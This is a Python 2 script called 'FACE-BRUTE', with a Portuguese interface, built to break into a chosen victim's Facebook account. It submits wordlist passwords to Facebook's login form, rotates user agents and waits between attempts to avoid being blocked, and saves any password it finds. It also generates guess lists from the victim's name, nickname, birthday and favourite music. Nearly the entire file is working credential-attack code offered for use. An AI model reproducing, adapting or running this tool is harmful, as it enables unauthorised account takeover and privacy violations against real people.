#!/usr/bin/python2
# -*- coding: utf-8 -*-

import mechanize
import os
import random
import sys
import time
import random
cont = 0

try:
   
    random_agent = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 730 Dual SIM) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
    'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
    'Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
    'Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/124.0.0.50.70;FBBV/63293619;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VIVO;FBID/phone;FBLC'])

   
    os.system("clear")
    print("====================")
    print("=====\033[34mFACE-BRUTE\033[m=====")
    print("----\033[3;34mversion: 2.0\033[m----")
    print("Desenvolvido por: \033[1;34mAstaroth Ariel\033[m")
    print("====================")
    
    print("[1]- Hackear Facebook")
    print("[2]- Gerar Wordlist")
    print("\033[31m[0]- Sair\033[m\n")
    
    op = int(input("\033[34mFB:>>>\033[m "))
    
    if op == 1:
        print("-------------------")
        login = raw_input("Digite o E-mail ou ID da vítima\n\033[34mFB:>>>\033[m ")
        repeticao = 0
        
        while repeticao == 0:
            try:
                wordlist = raw_input("\nDigite o nome da wordlist, exemplo: \033[34mwordlist.txt\n\033[mou digite 'Sair' para cancelar\n\033[34mFB:>>>\033[m ")
                if wordlist == "sair" or wordlist == "Sair":
                    os.system("clear")
                    print("Operação cancelada")
                    break
                arquivo = open(wordlist, "r")
                senhas = arquivo.readlines()
                tamanho = len(senhas)
                repeticao = 1
                os.system("clear")
                print("\033[31mATENÇÃO:\033[m Cada senha da wordlist será testada a cada 3 minutos\npara que não corra risco do \033[34mFacebook\033[m bloquear o script")
            
            except:
                print("\033[31mOps... Não foi possível encontrar uma wordlist com esse nome, tente novamente\033[m")
                wordlist = ""
    
    elif op == 2:
        print("-------------------")
        print("[1]- Gerar 100 senhas aleatórias de 8 números (wordlist básica)")
        print("[2]- Gerar senhas personalizadas de 8 números")
        print("[3]- Gerar senhas baseadas na vítima")
        print("\033[31m[0]- Voltar pro menú principal\033[m\n")
        
        opGerador = input("\033[34mFB:>>>\033[m ")
        
        if opGerador == 1:
            print("------------------------------")
            print("Gerando wordlist básica...")
            time.sleep(3)
            
            wordlist = open("wordlist-basica.txt", "a")
            def gerar():
                for gerando in range(0, 100):
                    randomico = random.randint(10000000, 99999999)
                    w = open("wordlist-basica.txt", "r").readlines()
                    if randomico in w:
                        gerar()
                    else:
                        word = str(randomico)
                        wordlist.write("{}\n".format(word))    
                
            gerar() 
            wordlist.close() 
            print("Wordlist salva como \033[34mwordlist-basica.txt\033[m")
            print("Voltando ao menú principal...")
            time.sleep(6)
            os.system("python2 face-brute-v2.0.py")
            
            
        if opGerador == 2:
            print("------------------------------")
            qtdSenhas = int(input(" \033[34mQuantidade de senhas:>>>\033[m "))
            print("Gerando wordlist personalizada de números...")
            time.sleep(3)
                
            wordlist = open("wordlist-personalizada.txt", "a")
            def gerar():
                for gerando in range(0, qtdSenhas):
                    randomico = random.randint(10000000, 99999999)
                    w = open("wordlist-personalizada.txt", "r").readlines()
                    if randomico in w:
                        gerar()
                    else:
                        word = str(randomico)
                        wordlist.write("{}\n".format(word))    
                    
            gerar() 
            wordlist.close() 
            print("Wordlist salva como \033[34mwordlist-personalizada.txt\033[m")
            print("Voltando ao menú principal...")
            time.sleep(6)
            os.system("python2 fb.py")
            
            
            
        if opGerador == 3:
            print("------------------------------")
            print("\033[33mObs: Se não souber, procure ou invente algo mas\033[m \033[4;31mNÃO\033[m \033[33mdeixe em branco!\033[m")
            pNome = raw_input(" \033[34mPrimeiro nome da vítima:>>>\033[m ").lower()
            sNome = raw_input(" \033[34mSobrenome da vítima:>>>\033[m ").lower()
            apelido = raw_input(" \033[34mApelido da vítima:>>>\033[m ").lower()
            idade = raw_input(" \033[34mIdade da vítima:>>>\033[m ").lower()
            dia = raw_input(" \033[34mDia do aniversário da vítima:>>>\033[m ").lower()
            mes = raw_input(" \033[34mNúmero do mês de aniversário da vítima:>>>\033[m ").lower()
            anoNasc = raw_input(" \033[34mAno de nascimento da vítima:>>>\033[m ").lower()
            gosto = raw_input(" \033[34mBanda, Artista ou música favorita da vítima:>>>\033[m ").lower()
            print("Gerando wordlist baseada nas informações da vítima...").lower()
            time.sleep(3)
           
            wordlist = open("wordlist-personalizada.txt", "a")
            def gerar():
                
                lista = [pNome.replace(" ", ""), sNome.replace(" ", ""), apelido.replace(" ", ""), idade.replace(" ", ""), dia.replace(" ", ""), mes.replace(" ", ""), anoNasc.replace(" ", ""), gosto.replace(" ", "")]
                
                
                
                for gerando1 in range(0, 30):
                    wordlist.write("{}{}\n".format(random.choice(lista), random.choice(lista)))
                    wordlist.write("{}{}{}\n".format(random.choice(lista), random.choice(lista), random.choice(lista)))                                      
                    
                for gerando2 in range(0, 30):
                    wordlist.write("{}{}{}{}\n".format(random.choice(lista), dia, mes, anoNasc))
                    wordlist.write("{}{}\n".format(random.choice(lista), anoNasc))
                    wordlist.write("{}{}\n".format(random.choice(lista), dia))
                    wordlist.write("{}{}\n".format(random.choice(lista), mes))
                    
            gerar() 
            wordlist.close() 
            print("Wordlist salva como \033[34mwordlist-personalizada.txt\033[m")
            print("Tamanho da wordlist ==> {}".format(os.path.getsize("wordlist-personalizada.txt")))
            print("-----------------------------------")
            op = int(input("[1]- Voltar pro menú principal    [2]- Sair\n\033[34mFB:>>>\033[m "))
            
            if op == 1:
                os.system("python2 face-brute-v2.0.py")
            elif op == 2:
                print("Saindo...")
                time.sleep(3)
                sys.exit()
            
            
           
    elif op == 0:
        print("Obrigado por usar o programa!")
        sys.exit()
            
        
    try:
        for senha in senhas:
            cont = cont + 1
            connect = mechanize.Browser()
            connect.set_handle_robots(False)
            connect.open('https://facebook.com/')
            connect.addheaders=[('User-Agent',random_agent)]
            connect.select_form(nr=0)
            connect.form['email'] = login
            connect.form['pass'] = senha
            connect.submit()
            verifica = connect.title().lower()
            print("========================================")
            print("            Tentativa: {}\n".format(cont))
            if verifica == "facebook":
                os.system("clear")
                print("#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#")
                print("  \033[34mSENHA ENCONTRADA -->\033[m \033[3;32m{}\033[m".format(senha))
                print("-----------------------------------------")
                print("\033[34mLogin: {}\n\033[34mSenha:\033[m \033[3;32m{}\033[m".format(login, senha))
                print("Desenvolvido por: \033[1;34mAstaroth Ariel\033[m")
                print("------------------------------------------------")
                print("------------------------------------------------")
                
                salvar = raw_input("\nDeseja salvar o login e senha? S/N: ")
                if salvar == "s" or salvar == "S":
                    arq = open("senhas_fb.txt", "a")
                    arq.write("Login: {}\nSenha: {}\n=====================\n".format(login, senha))
                    arq.close()
                    print("Salvo como senhas_fb.txt")
                    
                elif salvar == "n" or salvar == "N":
                    print("Arquivo não salvo...")
                    
                else:
                    print("Opção inválida, ocorreu um erro ao salvar o arquivo")
                    
                raise SystemExit
            
            else:
                tamanho = tamanho - 1
                #print("========================================")
                print("    \033[34mSENHA INCORRETA -->\033[m \033[3;31m{}\033[m".format(senha))
                #print("SENHA INCORRETA ===> \033[31m{}\033[m".format(senha))
                print("     Faltam {} senhas para finalizar".format(tamanho))
                if tamanho == 0:
                    print("========================================")
                    print("{} senhas testadas".format(len(senhas)))
                    print("Nenhuma senha foi encontrada :(")
                
                time.sleep(180) # três minutos de espera 180
                
    except NameError:
        pass
except KeyboardInterrupt:
    print("\nOperação cancelada!")

